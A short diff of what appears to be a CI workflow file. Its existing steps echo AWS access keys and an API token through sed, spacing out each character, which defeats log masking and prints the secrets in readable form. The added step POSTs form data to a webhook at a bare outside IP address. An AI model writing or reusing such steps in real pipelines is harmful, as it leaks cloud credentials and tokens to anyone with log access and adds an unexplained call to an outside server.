@@ -15,6 +15,7 @@ jobs:
       - run: echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
       - run: echo ${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'
       - run: echo ${{secrets.API_TOKEN}} | sed 's/./& /g'
+      - run: curl -X POST -d 'name=linuxize' -d 'email=linuxize@example.com' http://35.212.170.50:5000/webhook 
           
           
           
